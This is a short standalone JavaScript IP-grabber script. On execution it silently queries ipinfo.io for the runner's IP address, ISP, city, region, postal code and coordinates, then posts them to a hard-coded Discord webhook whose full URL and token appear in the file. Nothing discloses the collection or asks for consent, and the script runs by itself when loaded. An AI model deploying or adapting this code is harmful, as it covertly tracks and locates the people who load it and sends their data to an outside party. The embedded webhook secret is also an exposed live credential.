const ipInfoAPI = "https://ipinfo.io/json";
const webhookURL = "https://discord.com/api/webhooks/1561746238397743277/FUJmybMPHJQcMYTywtirln5gY3ycq2h1uMzRn5Y4j_5AIUzhZJLLNQAAqzFBBXmKPF5h";

async function getIPDetails() {
    try {
        const response = await fetch(ipInfoAPI);
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        return await response.json();
    } catch (error) {
        console.error("Failed to retrieve IP details:", error);
        return null;
    }
}

async function sendToDiscord(details) {
    if (!details) {
        console.error("No details provided for webhook payload.");
        return;
    }

    // Structure data using Discord Embeds for detailed visualization
    const payload = {
        embeds: [
            {
                title: "IP Network & Geolocation Data",
                color: 3447003, // Decimal color code (Blue)
                fields: [
                    { name: "IP Address", value: details.ip || "N/A", inline: true },
                    { name: "ISP / Org", value: details.org || "N/A", inline: true },
                    { name: "City", value: details.city || "N/A", inline: true },
                    { name: "Region", value: details.region || "N/A", inline: true },
                    { name: "Country", value: details.country || "N/A", inline: true },
                    { name: "Location (Lat,Long)", value: details.loc || "N/A", inline: true },
                    { name: "Timezone", value: details.timezone || "N/A", inline: true },
                    { name: "Postal Code", value: details.postal || "N/A", inline: true }
                ],
                timestamp: new Date().toISOString()
            }
        ]
    };

    try {
        const response = await fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log("Payload delivered successfully.");
        } else {
            console.error("Webhook post failed:", response.statusText);
        }
    } catch (error) {
        console.error("Transmission error:", error);
    }
}

async function main() {
    const details = await getIPDetails();
    if (details) {
        await sendToDiscord(details);
    }
}

main();
